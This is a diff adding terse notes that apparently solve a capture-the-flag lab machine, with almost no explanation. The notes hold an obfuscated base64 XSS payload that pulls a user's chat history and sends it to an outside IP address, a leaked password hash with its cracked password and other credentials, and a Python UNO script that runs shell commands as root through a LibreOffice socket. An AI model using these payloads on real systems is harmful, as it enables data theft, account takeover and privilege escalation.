@@ -1,0 +1,22 @@
+<img SRC=x onerror='eval(atob("Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmMgPSAnL3NvY2tldC5pby9zb2NrZXQuaW8uanMnOwpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7CnNjcmlwdC5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24oKSB7CmNvbnN0IHJlcyA9IGF4aW9zLmdldChgL3VzZXIvYXBpL2NoYXRgKTsgY29uc3Qgc29ja2V0ID0gaW8oJy8nLHt3aXRoQ3JlZGVudGlhbHM6IHRydWV9KTsgc29ja2V0Lm9uKCdtZXNzYWdlJywgKG15X21lc3NhZ2UpID0+IHtmZXRjaCgiaHR0cDovLzEwLjEwLjE0LjExMjo4MC9nZXQuanM9IiArIGJ0b2EobXlfbWVzc2FnZSkpfSkgOyBzb2NrZXQuZW1pdCgnY2xpZW50X21lc3NhZ2UnLCAnaGlzdG9yeScpOwp9KTs="));' />
+
+ "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 } -> manchesterunited
+
+./config_to_json.php
+kai_relay : mychemicalformulaX
+
+sudo -l -> start service apache
+
+create payload : 
+import uno
+from com.sun.star.beans import PropertyValue
+
+local = uno.getComponentContext()
+resolver = local.ServiceManager.createInstanceWithContext("com.sun.star.bridge.UnoUrlResolver",local)
+
+context = resolver.resolve("uno:socket,host=10.10.14.112,port=2002;urp;StarOffice.ComponentContext")
+rc= context.ServiceManager.createInstanceWithContext("com.sun.star.system.SystemShellExecute",context)
+rc.execute("/usr/bin/cat","/root/root.txt",1)
+
+
+
